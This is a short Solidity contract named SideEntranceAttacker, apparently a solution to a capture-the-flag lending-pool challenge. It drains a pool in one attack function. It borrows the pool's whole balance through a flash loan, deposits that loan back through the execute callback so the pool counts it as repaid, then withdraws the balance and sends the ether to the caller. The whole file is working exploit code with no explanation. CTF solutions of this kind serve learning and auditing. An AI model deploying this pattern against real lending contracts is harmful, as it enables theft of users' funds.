// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    IPool pool;

    constructor(address victim) {
        pool = IPool(victim);
    }

    fallback() external payable {}

    function attack() public payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
